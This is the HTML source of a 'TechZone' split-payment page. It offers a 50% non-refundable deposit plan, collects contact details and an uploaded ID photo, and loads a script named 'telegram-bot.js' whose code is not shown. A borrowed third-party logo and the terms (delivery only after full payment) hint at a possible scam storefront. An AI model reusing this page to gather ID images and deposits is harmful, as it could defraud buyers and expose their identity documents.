<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Split Payments - TechZone</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>

    <!-- Header (Copied from index.html for consistency) -->
    <header class="header">
        <div class="container">
            <div class="header-content">
                <div class="logo">
                    <a href="index.html">
                        <img src="https://1000logos.net/wp-content/uploads/2023/11/Swappie-Logo.png" alt="TechZone" style="height: 40px; width: auto;">
                    </a>
                </div>
                <nav class="nav-desktop">
                    <a href="index.html" class="nav-link" data-translate="home">Home</a>
                    <a href="index.html#products" class="nav-link" data-translate="products">Products</a>
                    <a href="split-payments.html" class="nav-link" data-translate="split_payment">Split Payment</a>
                    <a href="about.html" class="nav-link" data-translate="about">About</a>
                </nav>
                <div class="header-actions">
                    <a href="#" id="cart-button" class="cart-link">
                        <i class="fas fa-shopping-cart"></i>
                        <span id="cart-count" class="cart-count">0</span>
                    </a>
                </div>
            </div>
        </div>
    </header>

    <main class="page-content" style="padding: 4rem 2rem;">
        <div class="container" style="max-width: 800px; margin: auto;">
            <div class="section-header" style="text-align: center; margin-bottom: 3rem;">
                <h1 data-translate="split_payment_title">Pay in Installments</h1>
                <p data-translate="split_payment_desc" style="font-size: 1.1rem; color: #555;">Pay a 50% deposit today and split the rest over up to 6 months.</p>
            </div>

            <div class="split-payment-calculator" style="background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.08);">
                
                <!-- Step 1: Product Selection -->
                <div class="form-group" style="margin-bottom: 1.5rem;">
                    <label for="product-select" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">1. Select a Product</label>
                    <select id="product-select" class="form-control" style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd;">
                        <option value="">-- Choose a product --</option>
                    </select>
                </div>

                <!-- Step 2: Variant Selection -->
                <div class="form-group" style="margin-bottom: 1.5rem; display: none;" id="storage-group">
                    <label for="storage-select" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">2. Select Storage</label>
                    <select id="storage-select" class="form-control" style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd;"></select>
                </div>

                <!-- Step 3: Installment Plan -->
                <div class="form-group" style="margin-bottom: 1.5rem; display: none;" id="months-group">
                    <label for="months-select" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">3. Choose Your Plan</label>
                    <select id="months-select" class="form-control" style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd;">
                        <option value="1">1 Month (+2% interest)</option>
                        <option value="2">2 Months (+3% interest)</option>
                        <option value="3">3 Months (+4% interest)</option>
                        <option value="4">4 Months (+5% interest)</option>
                        <option value="5">5 Months (+6% interest)</option>
                        <option value="6" selected>6 Months (+7% interest)</option>
                    </select>
                </div>

                <!-- Calculation Display -->
                <div id="calculation-summary" style="margin-top: 2rem; border-top: 1px solid #eee; padding-top: 2rem; display: none;">
                    <h3 style="font-size: 1.5rem; font-weight: 700; margin-bottom: 1.5rem; text-align: center;">Payment Summary</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; font-size: 1.1rem;">
                        
                        <!-- Left Column -->
                        <div style="padding-right: 1rem; border-right: 1px solid #eee;">
                            <p style="margin-bottom: 0.75rem;"><strong>Product Price:</strong> <span id="summary-price"></span></p>
                            <p style="margin-bottom: 0.75rem;"><strong>Interest (<span id="summary-interest-rate"></span>%):</strong> <span id="summary-interest-amount"></span></p>
                            <p style="margin-bottom: 0.75rem; font-weight: bold;"><strong>New Total Price:</strong> <span id="summary-total-price"></span></p>
                        </div>

                        <!-- Right Column -->
                        <div>
                            <p style="margin-bottom: 0.75rem;"><strong>Deposit (50%):</strong> <span id="summary-deposit" style="color: #28a745; font-weight: bold;"></span></p>
                            <p style="margin-bottom: 0.75rem;"><strong>Remaining Balance:</strong> <span id="summary-remaining"></span></p>
                            <p style="margin-bottom: 0.75rem; font-weight: bold;"><strong>Monthly Payment:</strong> <span id="summary-monthly"></span></p>
                        </div>
                    </div>
                </div>
                
                <!-- Step 4: Your Information -->
                <div id="customer-info-section" style="margin-top: 2rem; border-top: 1px solid #eee; padding-top: 2rem; display: none;">
                    <h3 style="font-size: 1.2rem; font-weight: 700; margin-bottom: 1rem;">4. Your Information</h3>
                    <p style="font-size: 0.9rem; color: #555; margin-bottom: 1.5rem;">Please provide your details. This information is required to process your installment plan.</p>
                    <form id="customer-info-form">
                        <div class="form-row" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem;">
                            <div class="form-group">
                                <label for="customer-name" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">Full Name</label>
                                <input type="text" id="customer-name" class="form-control" required style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd;">
                            </div>
                            <div class="form-group">
                                <label for="customer-email" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">Email Address</label>
                                <input type="email" id="customer-email" class="form-control" required style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd;">
                            </div>
                        </div>
                        <div class="form-group" style="margin-top: 1rem;">
                            <label for="customer-phone" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">Phone Number (WhatsApp)</label>
                            <input type="tel" id="customer-phone" class="form-control" required style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd;">
                        </div>
                        <div class="form-group" style="margin-top: 1rem;">
                            <label for="customer-address" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">Full Delivery Address</label>
                            <textarea id="customer-address" class="form-control" rows="3" required style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd; resize: vertical;"></textarea>
                        </div>
                        <div class="form-group" style="margin-top: 1rem;">
                            <label for="id-upload" style="font-weight: 600; display: block; margin-bottom: 0.5rem;">Upload a Picture of Your ID</label>
                            <input type="file" id="id-upload" class="form-control" accept="image/*" required style="width: 100%; padding: 0.75rem; border-radius: 8px; border: 1px solid #ddd;">
                            <div id="id-preview" style="margin-top: 1rem; display: none; text-align: center; background: #f9f9f9; padding: 1rem; border-radius: 8px;">
                                <img src="" alt="ID Preview" style="max-width: 200px; max-height: 150px; border-radius: 8px; border: 1px solid #ddd;">
                            </div>
                        </div>
                    </form>
                </div>
                <!-- Step 5: Terms and Agreement -->
                <div id="terms-section" style="margin-top: 2rem; border-top: 1px solid #eee; padding-top: 2rem; display: none;">
                    <h3 style="font-size: 1.2rem; font-weight: 700; margin-bottom: 1rem;">5. Installment Plan Agreement</h3>
                    <div class="terms-box" style="height: 150px; overflow-y: scroll; border: 1px solid #ddd; padding: 1rem; border-radius: 8px; font-size: 0.9rem; margin-bottom: 1rem; background: #f9f9f9;">
                        <p>By proceeding, you agree to the following terms:</p>
                        <ol style="padding-left: 1.5rem;">
                            <li style="margin-bottom: 0.5rem;">You agree to pay a non-refundable 50% deposit of the total amount today.</li>
                            <li style="margin-bottom: 0.5rem;">The remaining balance will be paid in equal monthly installments over the selected period.</li>
                            <li style="margin-bottom: 0.5rem;">An interest rate, as specified in the summary, is applied to the original product price.</li>
                            <li style="margin-bottom: 0.5rem;">Failure to make monthly payments on time may result in late fees or cancellation of the plan.</li>
                            <li style="margin-bottom: 0.5rem;">The product will be delivered upon full payment of all installments.</li>
                            <li>All payments are final. Please review our full <a href="terms.html" target="_blank" style="color: var(--primary-color);">Terms and Conditions</a> for more details.</li>
                        </ol>
                    </div>
                    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
                        <div class="form-check" style="display: flex; align-items: center; gap: 0.5rem;">
                            <input type="checkbox" id="terms-agree-checkbox" style="transform: scale(1.2);">
                            <label for="terms-agree-checkbox" style="font-weight: 600; cursor: pointer;">I agree to the terms and conditions.</label>
                        </div>
                        <button id="download-agreement-btn" class="btn btn-secondary" style="padding: 0.5rem 1rem; font-size: 0.9rem;" disabled>
                            <i class="fas fa-file-pdf"></i> Download Agreement
                        </button>
                    </div>
                    <p style="margin-top: 1.5rem; font-size: 0.9rem; color: #555; background: #f0f8ff; padding: 1rem; border-radius: 8px; border-left: 4px solid var(--primary-color);">
                        <strong>What happens next?</strong> After you pay the 50% deposit, our team will review your application. We will contact you via WhatsApp within 24 hours to confirm your plan and arrange the next steps for your monthly payments.
                    </p>
                </div>
                <!-- Checkout Button -->
                <div class="text-center" style="margin-top: 2.5rem;">
                    <button id="proceed-to-checkout" class="btn btn-primary" style="width: 100%; max-width: 400px; padding: 1rem; font-size: 1.2rem;" disabled>
                        Pay Deposit & Start Plan
                    </button>
                </div>
            </div>
        </div>
    </main>

    <!-- Footer (Copied from index.html for consistency) -->
    <footer class="footer">
        <div class="container">
            <div class="footer-bottom">
                <p>&copy; 2024 TechZone. <span data-translate="rights_reserved">All rights reserved.</span></p>
            </div>
        </div>
    </footer>

    <!-- Cart Sidebar (Required for checkout modal) -->
    <div id="cart-overlay" class="cart-overlay">
        <div id="cart-sidebar" class="cart-sidebar">
            <div class="cart-header">
                <h2 data-translate="shopping_cart">Shopping Cart</h2>
                <button id="close-cart" aria-label="Close cart"><i class="fas fa-times"></i></button>
            </div>
            <div class="cart-items" id="cart-items"></div>
            <div class="cart-summary">
                <div class="summary-row total">
                    <span data-translate="total">Total:</span>
                    <span id="cart-total">$0.00</span>
                </div>
            </div>
            <div class="cart-actions">
                <button id="checkout-btn" class="btn btn-primary" data-translate="checkout">Proceed to Checkout</button>
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="telegram-bot.js"></script>
    <script src="product-split-payments.js"></script>
    <script src="script.js"></script>
    <script src="split-payment.js"></script>
    <!--Start of Tawk.to Script-->
    <script type="text/javascript">
    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
    (function(){
    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
    s1.async=true;
    s1.src='https://embed.tawk.to/68ccde8d05c2ee19277b977c/default';
    s1.charset='UTF-8';
    s1.setAttribute('crossorigin','*');
    s0.parentNode.insertBefore(s1,s0);
    })();
    </script>
    <!--End of Tawk.to Script-->

</body>
</html>
